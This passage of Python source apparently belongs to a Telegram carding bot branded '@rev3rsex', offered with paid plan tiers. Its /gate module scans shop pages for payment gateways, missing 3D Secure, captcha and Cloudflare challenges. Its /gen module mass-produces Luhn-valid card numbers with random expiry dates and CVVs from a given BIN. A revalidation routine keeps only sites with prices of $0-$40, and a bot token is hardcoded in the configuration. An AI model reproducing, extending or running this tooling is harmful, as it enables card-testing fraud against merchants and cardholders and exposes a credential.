<a href='https://t.me/rev3rsex'>⊀</a> ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>{len(working_sites)}/{len(user_sites)}</code>
<a href='https://t.me/rev3rsex'>⊀</a> ❌ 𝐃𝐞𝐚𝐝 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 ↬ <code>{len(user_sites) - len(working_sites)}/{len(user_sites)}</code>

<i>Only working sites (with prices between $0-$40) have been kept in your account.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Error sending report to user {user_id}: {str(e)}")
        if is_group:
            await update.message.reply_text(
                f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 ↬ <code>{str(e)}</code>

<i>Failed to send revalidation report. Please try again.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 ↬ <code>{str(e)}</code>

<i>Failed to send revalidation report. Please try again.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode="HTML"
            )
    
    # Delete status message
    try:
        if process_id in active_processes and "status_message" in active_processes[process_id]:
            await context.bot.delete_message(
                chat_id=update.message.chat_id,
                message_id=active_processes[process_id]["status_message"].message_id
            )
            # Remove the process from active_processes
            del active_processes[process_id]
    except Exception as e:
        logger.error(f"Error deleting status message: {str(e)}")

async def handle_resites_command(update: Update, context: CallbackContext):
    """
    Handle the /resites command for rechecking all user sites.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    logger.info(f"Resites command received from user {user_id} ({first_name})")
    
    # Check if user has an active plan (not Trial)
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial" and user_id != 7742548417:
        await update.message.reply_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙙 ⛔</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>This command is only available for users with an active plan.</i>

<i>Upgrade your plan to use site management features.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        logger.info(f"Resites command denied for trial user {user_id}")
        return
    
    # Get user's current sites
    user_sites = get_user_sites(user_id)
    
    if not user_sites:
        await update.message.reply_text(
            f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙉𝙤 𝙎𝙞𝙩𝙚𝙨 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>You don't have any sites configured.</i>

<i>Please add at least one site using the /seturl command.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        return
    
    # Generate a unique process ID for this command
    process_id = f"{user_id}_{int(time.time())}"
    
    # Send initial progress message
    progress_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 📊</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Site Revalidation
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝚊𝐥 𝐒𝐢𝐭𝐞𝐬 ↬ <code>{len(user_sites)}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐞𝐬𝐭𝐞𝐝 ↬ <code>0/{len(user_sites)} (0%)</code>
<a href='https://t.me/rev3rsex'>⊀</a> ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>0</code>
<a href='https://t.me/rev3rsex'>⊀</a> ❌ 𝐃𝐞𝐚𝐝 ↬ <code>0</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    status_message = await update.message.reply_text(
        progress_msg,
        parse_mode="HTML"
    )
    
    # Store the process information in the active_processes dictionary
    active_processes[process_id] = {
        "status_message": status_message,
        "user_id": user_id
    }
    
    # Process sites in background
    asyncio.create_task(_process_resites_sites(update, context, process_id))

async def handle_delall_callback(update: Update, context: CallbackContext):
    """
    Handle the callback from the delall confirmation button.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    callback_data = query.data
    
    if callback_data == "delall_cancel":
        await query.edit_message_text(
            f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙊𝙥𝙚𝙧𝙖𝙩𝙞𝙤𝙣 𝘾𝙖𝙣𝙘𝙚𝙡𝙚𝙙 ❌</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Your sites have not been deleted.</i>

<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        return
    
    if callback_data.startswith("delall_confirm_"):
        try:
            callback_user_id = int(callback_data.split("_")[2])
            
            # Check if the user who clicked is the same as the one who initiated the command
            if callback_user_id != user_id:
                await query.answer(
                    text="⛔ Not your business!",
                    show_alert=True
                )
                return
            
            # Remove all sites for the user
            if remove_all_user_sites(user_id):
                await query.edit_message_text(
                    f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙪𝘾𝙘𝙚𝙨𝙨 ✅</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>All sites deleted successfully!</i>

<i>You can add new sites using the /seturl command.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                    parse_mode="HTML"
                )
                logger.info(f"User {user_id} deleted all sites")
            else:
                await query.edit_message_text(
                    f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Failed to delete sites!</i>

<i>Please try again later.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                    parse_mode="HTML"
                )
                logger.error(f"Failed to delete all sites for user {user_id}")
        except (ValueError, IndexError) as e:
            logger.error(f"Error processing delall callback: {str(e)}")
            await query.edit_message_text(
                f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Error processing request!</i>

<i>Please try again.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode="HTML"
            )



# ============================================================
# MODULE: gate
# ============================================================
# Configure logging

# Configuration
BOT_TOKEN = "8705971644:AAH3DCTgpHi0C8nFWp5hDE9UDL3nLGNcJoE"
RATE_LIMIT_SECONDS = 3  # Minimum seconds between requests per user
CACHE_DURATION_SECONDS = 300  # Cache duration for website analysis (5 minutes)
MAX_CONCURRENT_REQUESTS = 10  # Maximum concurrent requests to avoid flooding

# CMS patterns to detect different platforms
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop/',
    'OpenCart': r'catalog/view/theme|opencart/',
    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
    'WordPress': r'wp-content|wp-includes/',
    'Joomla': r'media/jui|joomla\.js|joomla\.javascript/',
    'Drupal': r'sites/all/modules|drupal\.js/|sites/default/files|drupal\.settings\.js/',
    'TYPO3': r'typo3temp|typo3/',
    'Concrete5': r'concrete/js|concrete5/',
    'Umbraco': r'umbraco/|umbraco\.config/',
    'Sitecore': r'sitecore/content|sitecore\.js/',
    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
    'Episerver': r'episerver/|episerver\.js/',
    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
}

# Security patterns to detect security measures
SECURITY_PATTERNS = {
    '3D Secure': r'3d_secure|threed_secure|secure_redirect',
}

# Payment gateways list
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",
    "Apple Pay", "Google Pay", "Samsung Pay", "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",
    "Paytm", "UPI", "PayU", "PayUBiz", "PayUMoney", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree",
    "Klarna", "Affirm", "Afterpay",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa",
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",
]

# Global variables for session management and rate limiting
session: aiohttp.ClientSession = None
user_last_request: Dict[int, datetime] = {}
domain_cache: Dict[str, Dict] = {}
concurrent_requests: Set[str] = set()
semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

async def init_session():
    global session
    if session is None or session.closed:
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=50, force_close=True)
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

async def close_session():
    global session
    if session and not session.closed:
        await session.close()

# Fetch site content with rate limiting and caching
async def fetch_site(url: str):
    await init_session()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    domain = urlparse(url).netloc
    
    # Check cache first
    if domain in domain_cache:
        cache_entry = domain_cache[domain]
        if datetime.now() - cache_entry["timestamp"] < timedelta(seconds=CACHE_DURATION_SECONDS):
            logger.info(f"Using cached result for {domain}")
            return cache_entry["status"], cache_entry["html"], cache_entry["headers"]
    
    # Check if we're already fetching this domain
    if domain in concurrent_requests:
        logger.info(f"Already fetching {domain}, waiting...")
        while domain in concurrent_requests:
            await asyncio.sleep(0.5)
        # After waiting, check cache again
        if domain in domain_cache:
            cache_entry = domain_cache[domain]
            return cache_entry["status"], cache_entry["html"], cache_entry["headers"]
    
    # Add to concurrent requests
    concurrent_requests.add(domain)
    
    headers = {
        "authority": domain,
        "scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/140.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with semaphore:
            async with session.get(url, headers=headers, timeout=15) as resp:
                text = await resp.text()
                status = resp.status
                resp_headers = dict(resp.headers)
                
                # Cache the result
                domain_cache[domain] = {
                    "status": status,
                    "html": text,
                    "headers": resp_headers,
                    "timestamp": datetime.now()
                }
                
                return status, text, resp_headers
    except asyncio.TimeoutError:
        logger.error(f"Timeout while fetching {url}")
        return None, None, None
    except Exception as e:
        logger.error(f"Error fetching {url}: {e}")
        return None, None, None
    finally:
        # Remove from concurrent requests
        concurrent_requests.discard(domain)

# Detect CMS platform
def detect_cms(html: str):
    for cms, pattern in CMS_PATTERNS.items():
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            if cms == 'Custom CMS':
                return match.group(1) or "Custom CMS"
            return cms
    return "Unknown"

# Detect security measures
def detect_security(html: str):
    patterns_3ds = [
        r'3d\s*secure',
        r'verified\s*by\s*visa',
        r'mastercard\s*securecode',
        r'3ds',
        r'3ds2',
        r'acsurl',
        r'pareq',
        r'three-domain-secure',
        r'secure_redirect',
    ]
    for pattern in patterns_3ds:
        if re.search(pattern, html, re.IGNORECASE):
            return "3D Secure Detected ✅"
    return "2D (No 3D Secure Found ❌)"

# Detect payment gateways
def detect_gateways(html: str):
    detected = []
    for gateway in PAYMENT_GATEWAYS:
        # Use word boundaries to avoid partial matches (e.g., "PayU" in "PayUmoney")
        pattern = r'\b' + re.escape(gateway) + r'\b'
        if re.search(pattern, html, re.IGNORECASE):
            detected.append(gateway)
    return ", ".join(detected) if detected else "None Detected"

# Detect captcha
def detect_captcha(html: str):
    html_lower = html.lower()
    if "hcaptcha" in html_lower:
        return "hCaptcha Detected ✅"
    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
        return "reCAPTCHA Detected ✅"
    elif "captcha" in html_lower:
        return "Generic Captcha Detected ✅"
    return "No Captcha Detected"

# Detect Cloudflare
def detect_cloudflare(html: str, headers=None, status=None):
    if headers is None:
        headers = {}
    lower_keys = [k.lower() for k in headers.keys()]
    server = headers.get('Server', '').lower()
    # Check for Cloudflare presence (CDN or protection)
    cloudflare_indicators = [
        r'cloudflare',
        r'cf-ray',
        r'cf-cache-status',
        r'cf-browser-verification',
        r'__cfduid',
        r'cf_chl_',
        r'checking your browser',
        r'enable javascript and cookies',
        r'ray id',
        r'ddos protection by cloudflare',
    ]
    # Check headers for Cloudflare signatures
    if 'cf-ray' in lower_keys or 'cloudflare' in server or 'cf-cache-status' in lower_keys:
        # Parse HTML to check for verification/challenge page
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.title.string.strip().lower() if soup.title else ''
        challenge_indicators = [
            "just a moment",
            "attention required",
            "checking your browser",
            "enable javascript and cookies",
            "please wait while we verify",
        ]
        # Check for challenge page indicators
        if any(indicator in title for indicator in challenge_indicators):
            return "Cloudflare Verification Detected ✅"
        if any(re.search(pattern, html, re.IGNORECASE) for pattern in cloudflare_indicators):
            return "Cloudflare Verification Detected ✅"
        if status in (403, 503) and 'cloudflare' in html.lower():
            return "Cloudflare Verification Detected ✅"
        return "Cloudflare Present (No Verification) 🔍"
    return "None"

# Detect GraphQL
def detect_graphql(html: str):
    if re.search(r'/graphql|graphqlendpoint|apollo-client|query\s*\{|mutation\s*\{', html, re.IGNORECASE):
        return "GraphQL Detected ✅"
    return "No GraphQL Detected ❌"

# Format response with monospace text
def gate_format_response(url: str, cms: str, security: str, gateways: str, 
                   captcha: str, cloudflare: str, graphql: str, 
                   status_code: int, headers: Dict) -> str:
    # Parse domain from URL
    domain = urlparse(url).netloc
    
    # Format the response
    response = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑮𝒂𝒕𝒆 𝑪𝒉𝒆𝒄𝒌 𝑹𝒆𝒔𝒖𝒍𝒕𝒔</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐑𝐋</b> ↬ <code>{domain}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐏𝐀𝐘𝐌𝐄𝐍𝐓𝐒</b> ↬ <code>{gateways}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐌𝐒</b> ↬ <code>{cms}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐒𝐓𝐀𝐓𝐔𝐒</b> ↬ <code>{status_code}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘</b> ↬ <code>{security}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐀𝐏𝐓𝐂𝐇𝐀</b> ↬ <code>{captcha}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐋𝐎𝐔𝐃𝐅𝐋𝐀𝐑𝐄</b> ↬ <code>{cloudflare}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐑𝐀𝐏𝐇𝐐𝐋</b> ↬ <code>{graphql}</code>"""
    
    # Add dev link
    response += "\n<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
    
    return response

# Check rate limit for a user
def check_rate_limit(user_id: int) -> bool:
    now = datetime.now()
    if user_id in user_last_request:
        time_diff = (now - user_last_request[user_id]).total_seconds()
        if time_diff < RATE_LIMIT_SECONDS:
            return False
    user_last_request[user_id] = now
    return True

# Main command handler
async def handle_gate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handle the /gate command to analyze a website.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Check rate limit
    user_id = update.effective_user.id
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⚠️ <b>Rate limit exceeded!</b>\n\n"
            f"<i>Please wait {RATE_LIMIT_SECONDS} seconds between requests.</i>",
            parse_mode="HTML"
        )
        return
    
    # Get the URL from command
    if not context.args:
        await update.message.reply_text(
            "⚠️ <b>Missing URL!</b>\n\n"
            "<i>Usage: /gate [url]</i>\n\n"
            "<i>Example: /gate example.com</i>",
            parse_mode="HTML"
        )
        return
    
    url = context.args[0]
    
    # Auto-add https if not present
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    # Send a processing message
    processing_message = await update.message.reply_text(
        f"<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝘀𝒕𝒕𝘀...</b></pre>\n"
        f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐑𝐋</b> ↬ <code>{url}</code>",
        parse_mode="HTML"
    )
    
    try:
        # Fetch the site
        status_code, html, headers = await fetch_site(url)
        
        if status_code is None:
            # Failed to fetch
            await processing_message.edit_text(
                "⚠️ <b>Error:</b> <code>Failed to fetch the site</code>\n\n"
                "<i>Please check the URL and try again.</i>",
                parse_mode="HTML"
            )
            return
        
        # Parse the HTML
        soup = BeautifulSoup(html, 'html.parser')
        
        # Detect various aspects
        cms = detect_cms(html)
        security = detect_security(html)
        gateways = detect_gateways(html)
        captcha = detect_captcha(html)
        cloudflare = detect_cloudflare(html, headers, status_code)
        graphql = detect_graphql(html)
        
        # Format and send the response
        response = gate_format_response(
            url, cms, security, gateways, 
            captcha, cloudflare, graphql, 
            status_code, headers
        )
        
        await processing_message.edit_text(response, parse_mode="HTML")
    
    except Exception as e:
        logger.error(f"Error in gate command: {e}")
        await processing_message.edit_text(
            f"⚠️ <b>Error:</b> <code>{str(e)}</code>\n\n"
            "<i>Please try again later.</i>",
            parse_mode="HTML"
        )

# Error handler
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log Errors caused by Updates."""
    logger.error(f'Exception while handling an update: {context.error}')
    
    # Try to inform the user about the error
    if update and hasattr(update, 'message') and update.message:
        try:
            await update.message.reply_text(
                "⚠️ <b>An error occurred!</b>\n\n"
                "<i>Please try again later.</i>",
                parse_mode="HTML"
            )
        except Exception:
            pass  # Ignore errors in error handler




# ============================================================
# MODULE: gen
# ============================================================
# Configure logging

# Dictionary to track last command time for each user (for cooldown)
last_command_time = {}

def gen_luhn_check(card_number: str) -> bool:
    """
    Validate a card number using the Luhn algorithm.
    
    Args:
        card_number: Card number as string
        
    Returns:
        True if valid, False otherwise
    """
    # Convert to list of integers
    digits = [int(d) for d in card_number]
    
    # Double every second digit from the right
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] = (digits[i] // 10) + (digits[i] % 10)
    
    # Sum all digits
    total = sum(digits)
    
    # Check if divisible by 10
    return total % 10 == 0

def generate_luhn_card(prefix: str, length: int = 16) -> str:
    """
    Generate a valid credit card number using the Luhn algorithm.
    
    Args:
        prefix: The BIN or prefix to start the card with
        length: Total length of the card number (default 16)
        
    Returns:
        Valid credit card number as string
    """
    # Start with the prefix
    card = prefix
    
    # Generate random digits for all but the last digit
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    
    # Calculate the last digit to make it valid
    for i in range(10):  # Try digits 0-9
        test_card = card + str(i)
        if gen_luhn_check(test_card):
            return test_card
    
    # Fallback (shouldn't happen)
    return card + "0"

def parse_gen_input(input_text: str) -> Tuple[str, str, str, int, str]:
    """
    Parse the input for the gen command.
    
    Args:
        input_text: Input text after the /gen command
        
    Returns:
        Tuple of (bin_pattern, month, year, amount, cvv)
    """
    # Default values
    bin_pattern = ""
    month = "rnd"
    year = "rnd"
    amount = 10  # Default amount
    cvv = "rnd"
    
    # Check for pipe format first (e.g., 486732|01|24|123|100)
    if "|" in input_text:
        parts = input_text.split("|")
        
        # First part is the BIN/prefix
        if len(parts) > 0:
            bin_pattern = parts[0].strip()
        
        # Second part is the month
        if len(parts) > 1:
            month = parts[1].strip()
            if month.lower() == "rnd":
                month = "rnd"
        
        # Third part is the year
        if len(parts) > 2:
            year = parts[2].strip()
            if year.lower() == "rnd":
                year = "rnd"
            elif len(year) == 4:
                year = year[2:]  # Convert YYYY to YY
        
        # Fourth part is CVV or amount
        if len(parts) > 3:
            part4 = parts[3].strip()
            if part4.lower() == "rnd":
                cvv = "rnd"
            else:
                try:
                    # Check if it's a number (amount)
                    test_amount = int(part4)
                    if test_amount > 0:
                        amount = test_amount
                    else:
                        # If not a positive number, treat as CVV
                        cvv = part4
                except ValueError:
                    # If not a number, treat as CVV
                    cvv = part4
        
        # Fifth part could be amount if CVV was specified
        if len(parts) > 4:
            try:
                test_amount = int(parts[4].strip())
                if test_amount > 0:
                    amount = test_amount
            except ValueError:
                pass
    
    # Check for space-separated format (e.g., 486732 01 24 123 100)
    else:
        parts = input_text.split()
        
        # First part is the BIN/prefix
        if len(parts) > 0:
            bin_pattern = parts[0].strip()
        
        # Second part could be month or amount
        if len(parts) > 1:
            try:
                # Try to parse as amount first
                test_amount = int(parts[1].strip())
                if test_amount > 0:
                    amount = test_amount
                else:
                    month = parts[1].strip()
            except ValueError:
                # Not a number, treat as month
                month = parts[1].strip()
        
        # Third part is year if month was specified
        if len(parts) > 2 and month != "rnd":
            year = parts[2].strip()
            if year.lower() == "rnd":
                year = "rnd"
            elif len(year) == 4:
                year = year[2:]  # Convert YYYY to YY
        
        # Fourth part is CVV if month and year were specified
        if len(parts) > 3 and month != "rnd" and year != "rnd":
            cvv = parts[3].strip()
            if cvv.lower() == "rnd":
                cvv = "rnd"
        
        # Fifth part could be amount if CVV was specified
        if len(parts) > 4:
            try:
                test_amount = int(parts[4].strip())
                if test_amount > 0:
                    amount = test_amount
            except ValueError:
                pass
    
    # Validate bin_pattern - must be at least 6 digits
    if not bin_pattern or len(bin_pattern) < 6:
        raise ValueError("BIN must be at least 6 digits long")
    
    # Return the parsed values
    return bin_pattern, month, year, amount, cvv

async def generate_cards_with_bin_info(bin_pattern: str, month: str, year: str, amount: int, cvv: str) -> Tuple[List[str], Dict]:
    """
    Generate credit cards with BIN information.
    
    Args:
        bin_pattern: BIN or prefix to use for card generation
        month: Expiry month ("rnd" for random or specific month)
        year: Expiry year ("rnd" for random or specific year)
        amount: Number of cards to generate
        cvv: CVV to use ("rnd" for random or specific CVV)
        
    Returns:
        Tuple of (list of generated cards, BIN information)
    """
    # Get BIN information
    bin_number = bin_pattern[:6]
    bin_info = await get_bin_info(bin_number)
    
    # Determine if this is an Amex card
    is_amex = bin_info.get("scheme", "").lower() == "american express" or bin_pattern.startswith(("34", "37"))
    
    # Generate cards
    cards = []
    for _ in range(amount):
        # Generate random month for each card
        if month.lower() == "rnd":
            card_month = str(random.randint(1, 12)).zfill(2)
        else:
            card_month = month
        
        # Generate random year for each card
        if year.lower() == "rnd":
            current_year = time.strftime("%y")
            card_year = str(random.randint(int(current_year), int(current_year) + 7)).zfill(2)
        else:
            card_year = year
        
        # Determine card length based on card type
        card_length = 15 if is_amex else 16
        
        # Generate a valid card number
        card_number = generate_luhn_card(bin_pattern, card_length)
        
        # Generate appropriate CVV based on card type
        if cvv.lower() == "rnd":
            card_cvv = str(random.randint(1000, 9999)) if is_amex else str(random.randint(100, 999))
        else:
            card_cvv = cvv
            # Adjust CVV length based on card type
            if is_amex and len(card_cvv) == 3:
                # For Amex, ensure 4-digit CVV
                card_cvv = card_cvv + str(random.randint(0, 9))
            elif not is_amex and len(card_cvv) == 4:
                # For non-Amex, ensure 3-digit CVV
                card_cvv = card_cvv[:3]
        
        # Format as card|mm|yy|cvv
        card = f"{card_number}|{card_month}|{card_year}|{card_cvv}"
        cards.append(card)
    
    return cards, bin_info

def format_cards_with_bin_info(cards: List[str], bin_info: Dict) -> str:
    """
    Format generated cards with BIN information.
    
    Args:
        cards: List of generated cards
        bin_info: BIN information dictionary
        
    Returns:
        Formatted string with cards and BIN info
    """
    # Extract only the requested BIN information
    brand = (bin_info.get("scheme") or "N/A").title()
    bank = bin_info.get("bank") or "N/A"
    country = bin_info.get("country") or "Unknown"
    card_type = bin_info.get("type", "N/A")
    
    # Create header with status
    header = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{len(cards)} 𝘾𝙖𝙧𝙙𝙨</b> ✅</pre>

"""
    
    # Add cards (limit display to 50 for readability)
    display_cards = cards[:50] if len(cards) > 50 else cards
    card_list = "\n".join([f"<code>{card}</code>" for card in display_cards])
    
    # Add note if more cards were generated
    if len(cards) > 50:
        card_list += f"\n\n<code>... and {len(cards) - 50} more cards (sent in file)</code>"
    
    # Create BIN info section at the bottom inside a code block
    bin_info_block = f"""

<pre>┌─ 𝐁𝐢𝐧: {brand}
├─ 𝐁𝐚𝐧𝐤: {bank}
├─ 𝐂𝐨𝐮𝐧𝐭𝐲: {country}
└─ 𝐓𝐨𝐩𝐞: {card_type}</pre>"""
    
    return f"{header}{card_list}{bin_info_block}"

def format_bin_info_for_caption(bin_info: Dict, bin_pattern: str, amount: int) -> str:
    """
    Format BIN information for the file caption.
    
    Args:
        bin_info: BIN information dictionary
        bin_pattern: The BIN pattern used
        amount: Number of cards generated
        
    Returns:
        Formatted string with BIN info for caption
    """
    # Extract BIN information
    brand = (bin_info.get("scheme") or "N/A").title()
    bank = bin_info.get("bank") or "N/A"
    country = bin_info.get("country") or "Unknown"
